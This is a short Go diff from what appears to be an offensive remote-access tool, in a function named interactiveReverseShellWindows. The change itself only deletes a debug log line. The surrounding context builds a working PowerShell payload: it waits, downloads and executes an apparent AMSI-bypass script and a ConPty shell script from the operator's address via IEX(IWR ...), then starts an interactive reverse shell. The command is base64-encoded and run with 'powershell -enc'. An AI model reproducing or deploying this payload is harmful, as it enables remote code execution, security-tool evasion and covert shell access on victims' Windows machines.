@@ -319,7 +319,6 @@ func (terminal *Terminal) interactiveReverseShellWindows() {
 	payloadPowershell := `Start-Sleep -s 7; IEX(IWR http://` + terminal.Con.LocalAddr().String() + `/amsi -UseBasicParsing);IEX(IWR http://` + terminal.Con.LocalAddr().String() + `/conpty -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
 	payloadPowershell, _ = utils.Utf16leBase64(payloadPowershell)
 	command := "powershell -enc " + payloadPowershell
-	terminal.Log.Debug("Send the command: " + command)
 	terminal.execute(command, []byte{0})
 	terminal.Con.Close()
 }
